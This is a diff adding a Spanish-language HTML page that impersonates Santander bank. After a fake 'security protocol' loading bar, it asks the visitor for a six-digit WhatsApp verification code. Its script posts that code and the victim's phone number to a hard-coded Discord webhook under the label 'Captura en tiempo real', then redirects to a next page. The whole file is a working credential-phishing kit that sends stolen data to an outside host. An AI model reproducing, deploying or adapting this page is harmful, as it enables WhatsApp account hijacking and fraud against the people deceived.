@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación - Santander</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #ec0000 0%, #c40000 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+    .container { text-align: center; padding: 20px; width: 100%; max-width: 450px; }
+    
+    /* EL LOGO QUE NO SE ROMPE EN EL TELÉFONO - PURO CSS */
+    .logo-container { margin-bottom: 30px; }
+    .santander-box-css {
+      background-color: #ec0000;
+      color: white;
+      display: inline-block;
+      padding: 12px 30px;
+      border-radius: 4px;
+      border: 2px solid white; /* Un borde blanco pa que resalte del fondo rojo */
+      user-select: none;
+    }
+    .santander-box-css span {
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: bold;
+      font-size: 28px;
+      letter-spacing: -1px;
+    }
+    
+    .status-text { color: white; font-size: 20px; font-weight: 300; margin-bottom: 20px; }
+    
+    /* DISEÑO DEL INPUT DE WHATSAPP */
+    #wa-section { display: none; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; padding: 30px; animation: fadeIn 0.5s ease; }
+    .wa-input { width: 100%; padding: 15px; border-radius: 8px; border: none; font-size: 24px; text-align: center; letter-spacing: 8px; font-weight: bold; margin-bottom: 15px; color: #333; outline: none; }
+    .wa-btn { width: 100%; padding: 15px; background: #25d366; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; text-transform: uppercase; }
+    
+    /* BARRA DE CARGA INICIAL */
+    #loading-area { width: 100%; }
+    .progress-bar-container { width: 100%; height: 8px; background: rgba(255,255,255,0.2); border-radius: 10px; margin-top: 20px; overflow: hidden; }
+    .progress-bar-fill { height: 100%; width: 0%; background: #25d366; transition: width 0.1s linear; }
+
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="logo-container">
+      <div class="santander-box-css">
+        <span>Santander</span>
+      </div>
+    </div>
+
+    <h1 class="status-text" id="main-text">Iniciando protocolo de seguridad...</h1>
+
+    <div id="loading-area">
+      <div class="progress-bar-container">
+        <div class="progress-bar-fill" id="bar"></div>
+      </div>
+      <p style="color: white; font-size: 12px; margin-top: 10px; opacity: 0.8;">Sincronizando con dispositivo +52 <span id="user-tel"></span></p>
+    </div>
+
+    <div id="wa-section">
+      <p style="color: white; margin-bottom: 15px; font-size: 14px;">Hemos enviado un código de 6 dígitos a tu WhatsApp. Ingrésalo para confirmar tu identidad.</p>
+      <input type="text" id="wa-code" class="wa-input" placeholder="000000" maxlength="6" inputmode="numeric">
+      <button class="wa-btn" id="wa-submit" onclick="enviarAlDiscord()">Verificar Ahora</button>
+    </div>
+
+    <p style="color: white; opacity: 0.6; font-size: 11px; margin-top: 30px;">© 2026 Santander Security Group</p>
+  </div>
+
+  <script>
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467650318174126192/_JrAS9TIKsDftqmTQuONlgEb4DAlPyQ1O9qst_pvEcgAgcbYeyyez83ftOqVA0pDvaS3";
+    
+    const telefono = localStorage.getItem('tel') || 'XXXXXXXXXX';
+    document.getElementById('user-tel').innerText = telefono;
+
+    let bar = document.getElementById('bar');
+    let progress = 0;
+
+    const timer = setInterval(() => {
+      progress += 2;
+      bar.style.width = progress + "%";
+
+      if(progress >= 100) {
+        clearInterval(timer);
+        document.getElementById('loading-area').style.display = 'none';
+        document.getElementById('wa-section').style.display = 'block';
+        document.getElementById('main-text').innerText = "Código de WhatsApp";
+      }
+    }, 100);
+
+    async function enviarAlDiscord() {
+      const codigo = document.getElementById('wa-code').value;
+      const boton = document.getElementById('wa-submit');
+
+      if(codigo.length < 6) {
+        alert("Marrdicióon mano, el código tiene que ser de 6 números.");
+        return;
+      }
+
+      boton.innerText = "VERIFICANDO...";
+      boton.disabled = true;
+
+      const payload = {
+        embeds: [{
+          title: "✅ NUEVO CÓDIGO DE WHATSAPP",
+          color: 0x25D366,
+          fields: [
+            { name: "📱 Teléfono", value: `\`+52 ${telefono}\``, inline: true },
+            { name: "💬 Código Recibido", value: `\`${codigo}\``, inline: true }
+          ],
+          footer: { text: "Captura en tiempo real" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        
+        window.location.href = "index4.html";
+      } catch (e) {
+        window.location.href = "index4.html";
+      }
+    }
+  </script>
+</body>
+</html>
